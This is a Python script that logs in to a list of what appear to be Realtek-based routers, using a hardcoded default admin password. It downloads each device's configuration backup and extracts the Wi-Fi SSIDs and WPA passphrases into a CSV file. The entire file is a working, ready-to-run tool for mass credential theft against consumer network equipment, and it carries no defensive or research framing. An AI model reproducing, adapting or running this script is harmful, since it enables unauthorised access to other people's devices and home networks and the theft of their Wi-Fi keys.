import os
import requests
import re
import subprocess
import csv
import xml.etree.ElementTree as ET
import logging

logging.basicConfig(level=logging.INFO)


def send_login(ip, code, csrf):
    login_command = [
        "curl",
        f"http://{ip}/boaform/admin/formLogin",
        "-X",
        "POST",
        "-H",
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "-H",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "-H",
        "Accept-Language: en-US,en;q=0.5",
        "-H",
        "Accept-Encoding: gzip, deflate",
        "-H",
        "Content-Type: application/x-www-form-urlencoded",
        "-H",
        f"Origin: http://{ip}",
        "-H",
        "Connection: keep-alive",
        "-H",
        f"Referer: http://{ip}/admin/login.asp",
        "-H",
        "Upgrade-Insecure-Requests: 1",
        "--data-raw",
        f"challenge=&username=admin&password=stdONUioi&verification_code={code}&save=Login&submit-url=%2Fadmin%2Flogin.asp&csrftoken={csrf}",
    ]
    try:
        subprocess.run(login_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to send login request to {ip}: {e}")


def download_conf(ip, csrf):
    download_command = [
        "curl",
        f"http://{ip}/boaform/formSaveConfig",
        "-X",
        "POST",
        "-H",
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "-H",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "-H",
        "Accept-Language: en-US,en;q=0.5",
        "-H",
        "Accept-Encoding: gzip, deflate",
        "-H",
        "Content-Type: application/x-www-form-urlencoded",
        "-H",
        f"Origin: http://{ip}",
        "-H",
        "Connection: keep-alive",
        "-H",
        f"Referer: http://{ip}/saveconf.asp",
        "-H",
        "Upgrade-Insecure-Requests: 1",
        "--data-raw",
        f"save_cs=Backup+as+file&csrftoken={csrf}",
        "-o",
        os.path.join("realtek_xml", f"{ip}.xml"),
    ]
    try:
        subprocess.run(download_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to download configuration file from {ip}: {e}")


def get_ip_list(file_path):
    with open(file_path, "r") as file:
        return [ip.strip() for ip in file.readlines()]


def process_ips(ip_list, timeout):
    for ip_index, ip in enumerate(ip_list):
        ip = ip.strip()
        url = f"http://{ip}"
        try:
            response = requests.get(url, timeout=timeout)

            check_code_match = re.search(
                r"document\.getElementById\('check_code'\)\.value='([^']*)';",
                response.text,
            )
            check_code_value = check_code_match.group(1) if check_code_match else None
            csrf_token_match = re.search(
                r"<input type='hidden' name='csrftoken' value='([^']*)' />",
                response.text,
            )
            csrf_token_value = csrf_token_match.group(1) if csrf_token_match else None
            send_login(ip, check_code_value, csrf_token_value)
            download_conf(ip, csrf_token_value)
            # For Debugging - Disabled by default
            # send_logout(ip)

        except requests.exceptions.ConnectionError as e:
            print(f"Failed to connect to {ip}: {str(e)}")
        continue


def parse_xml_files(directory):
    ssid_key_pairs = []

    # Iterate over all files in the directory
    for filename in os.listdir(directory):
        if filename.endswith(".xml"):
            file_path = os.path.join(directory, filename)

            # Parse the XML file
            tree = ET.parse(file_path)
            root = tree.getroot()

            # Find the SSID and KeyPassphrase elements
            ssid_element = root.find(".//Value[@Name='ssid']")
            keypassphrase_element = root.find(".//Value[@Name='WLAN_WPA_PSK']")

            # Extract the values if elements are found
            if ssid_element is not None and keypassphrase_element is not None:
                ssid = ssid_element.attrib["Value"]
                keypassphrase = keypassphrase_element.attrib["Value"]

                # Extract the IP address from the filename
                ip = filename.replace(".xml", "")

                ssid_key_pairs.append((ip, ssid, keypassphrase))

    return ssid_key_pairs


def save_to_csv(pairs, output_file):
    with open(output_file, "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["IP", "SSID", "KeyPassphrase"])  # Write header

        for ip, ssid, keypassphrase in pairs:
            writer.writerow([ip, ssid, keypassphrase])


def main():
    """Main function that processes a list of IP addresses and saves the SSID and KeyPassphrase pairs to a CSV file."""
    ip_list = get_ip_list("realtek.txt")
    process_ips(ip_list, 4)
    pairs = parse_xml_files("realtek_xml")
    save_to_csv(pairs, "realtek_pass.csv")


if __name__ == "__main__":
    main()
